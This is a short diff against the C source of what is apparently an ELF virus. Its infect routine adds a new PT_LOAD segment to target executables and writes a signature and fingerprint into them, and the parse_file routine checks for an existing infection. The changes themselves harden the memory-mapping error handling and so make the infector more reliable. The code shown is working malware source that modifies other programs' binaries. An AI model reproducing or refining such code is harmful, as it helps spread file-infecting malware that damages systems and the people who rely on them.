@@ -503,7 +503,10 @@ static int parse_file(char *path, inout struct stat *statbuf, inout t_elf *elf,
 	*file_data = (void *) rt_vector(9, 0, statbuf->st_size, PROT_READ,
 									MAP_SHARED, fd, 0);
 	if (*file_data == MAP_FAILED)
+	{
+		*file_data = NULL;
 		goto error;
+	}
 	if (find_signature(*file_data, statbuf->st_size, ALPHA, OMEGA) >= 0)
 		goto error;
 
@@ -521,7 +524,10 @@ static int parse_file(char *path, inout struct stat *statbuf, inout t_elf *elf,
 	*file_data = (void *) rt_vector(9, 0, statbuf->st_size + *enlarging,
 									PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
 	if (*file_data == MAP_FAILED)
+	{
+		*file_data = NULL;
 		goto error;
+	}
 	if (((unsigned *) *file_data)[0] != ELF_MAGIC)
 		goto error;
 	elf->header = (ElfW(Ehdr) *) *file_data;
@@ -582,7 +588,7 @@ static void infect(char *path, void *begin_ptr, char *curare, size_t flower,
 		   elf.header->e_phnum * elf.header->e_phentsize);
 	elf.header->e_phoff = append_pos;
 	elf.segments = (ElfW(Phdr) *) (file_data + elf.header->e_phoff);
-	elf.segments[elf.header->e_phnum] = (ElfW(Phdr)) {
+	elf.segments[elf.header->e_phnum] = (ElfW(Phdr)){
 		.p_type = PT_LOAD,
 		.p_align = 0x1000,
 		.p_filesz = enlarging,
@@ -623,6 +629,6 @@ static void infect(char *path, void *begin_ptr, char *curare, size_t flower,
 	memcpy(file_data + signature_pos + FINGERPRINT_OFFSET, fingerprint,
 		   sizeof(fingerprint));
 clean:
-	if (file_data != MAP_FAILED)
+	if (file_data)
 		vm_release(file_data, statbuf.st_size + enlarging);
 }
